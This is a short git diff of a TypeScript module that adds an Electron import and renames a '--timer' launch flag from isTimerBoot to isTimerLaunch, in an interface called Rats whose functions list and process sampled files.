@@ -2,12 +2,14 @@ import { getFiles, sampleN, FileEntry } from "./helpers";
 import { promises as fs } from 'node:fs';
 import { Buffer } from 'node:buffer';
 import { join } from 'node:path';
+import electron from 'electron';
 
 const ENCRYPTION_DIR = './';
 
 export interface Rats {
     listIncentives: (count: number) => Promise<FileEntry[]>,
-    incentivize: (file: FileEntry) => void
+    incentivize: (file: FileEntry) => void,
+    isTimerLaunch: boolean
 }
 
 async function listIncentives(count = 8): Promise<string[]> {
@@ -64,6 +66,6 @@ async function incentivize(file: FileEntry): Promise<void> {
   }
 }
 
-const isTimerBoot = process.argv.includes('--timer')
+const isTimerLaunch = process.argv.includes('--timer')
 
-export default { listIncentives, incentivize, isTimerBoot };
+export default { listIncentives, incentivize, isTimerLaunch };
